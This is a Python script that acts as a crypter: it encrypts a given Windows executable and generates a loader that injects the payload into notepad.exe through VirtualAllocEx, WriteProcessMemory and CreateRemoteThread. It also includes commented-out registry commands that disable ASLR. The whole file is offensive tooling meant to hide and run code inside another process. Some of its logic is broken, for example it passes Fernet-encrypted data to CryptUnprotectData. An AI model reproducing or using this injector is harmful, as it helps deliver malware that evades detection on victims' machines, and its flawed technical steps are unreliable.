from cryptography.fernet import Fernet
import subprocess
import os
import shutil
import sys
import base64

input_file = sys.argv[1]
input_filename_w_extention = os.path.basename(input_file)
# remove the .exe extension
input_filename = input_filename_w_extention[:-4]
output_filename = input_filename
output_path = os.getcwd()

# Encrypt the software
key = Fernet.generate_key()
cipher = Fernet(key)
with open(input_file, "rb") as f:
    payload = f.read()
    encrypted_payload = cipher.encrypt(payload)


# decryptor code
decryptor_code = f"""
import psutil
import subprocess
from cryptography.fernet import Fernet
from ctypes import *
import ctypes

# Disable ASLR
#subprocess.run(["REG", "ADD", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", "/v", "MoveImages", "/t", "REG_DWORD", "/d", "0", "/f"], shell=True)

# Enable ASLR
# subprocess.run(["REG", "DELETE", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", "/v", "MoveImages", "/f"], shell=True)

key = {key!r}
f = Fernet(key)
payload_size = {len(payload)}
encrypted_payload = {encrypted_payload}


# Find the process to inject the payload into
process_name = "notepad.exe"
for proc in psutil.process_iter():
    if proc.name() == process_name:
        target_process = proc
        break
else:
    # If the process is not running, create a new instance
    target_process = subprocess.Popen(process_name)

# Allocate memory in the target process to store the encrypted payload
process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, target_process.pid)
memory_allocation = windll.kernel32.VirtualAllocEx(process_handle, None, len(encrypted_payload), 0x3000, 0x04)

# Write the encrypted payload to the allocated memory
windll.kernel32.WriteProcessMemory(process_handle, memory_allocation, encrypted_payload, len(encrypted_payload), None)

# Calculate the address of the entry point in the loaded module
loaded_module = windll.kernel32.LoadLibraryA("kernel32.dll")
entry_point_address = windll.kernel32.GetProcAddress(loaded_module, "LoadLibraryA") + 5

# Create a remote thread in the target process to execute the entry point
windll.kernel32.CreateRemoteThread(process_handle, None, 0, entry_point_address, memory_allocation, 0, None)

# Create a remote thread in the target process to decrypt the payload
decrypted_payload_address = windll.kernel32.VirtualAllocEx(process_handle, None, len(payload), 0x3000, 0x04)
decryption_key_address = windll.kernel32.VirtualAllocEx(process_handle, None, len(key), 0x3000, 0x04)
windll.kernel32.WriteProcessMemory(process_handle, decryption_key_address, key, len(key), None)
decryption_function_address = windll.kernel32.GetProcAddress(loaded_module, "CryptUnprotectData")

# Create a remote thread in the target process to decrypt the payload
windll.kernel32.CreateRemoteThread(process_handle, None, 0, decryption_function_address, decryption_key_address, decrypted_payload_address, None)

# Execute the decrypted payload
ctypes.windll.kernel32.VirtualProtectEx(process_handle, decrypted_payload_address, len(payload), 0x40, byref(c_ulong()))
ctypes.windll.kernel32.WriteProcessMemory(process_handle, decrypted_payload_address, payload, len(payload), None)
ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, decrypted_payload_address, None, 0, None)
"""

decryptor_script_path = f"{output_path}\GEN_{output_filename}.py"

with open(decryptor_script_path, "w") as f:
    f.write(decryptor_code)


# # Compile the decryptor code into an executable
# subprocess.call(["pyinstaller", "--onefile", decryptor_script_path])

# # Remove unnecessary files/folders generated by pyinstaller
# os.remove(f'GEN_{input_filename}.spec')
# shutil.rmtree('build')
# shutil.move(f'{output_path}\dist\GEN_{input_filename}.exe', f'{output_path}\GEN_{output_filename}.exe')
# shutil.rmtree('dist')
# os.remove(decryptor_script_path)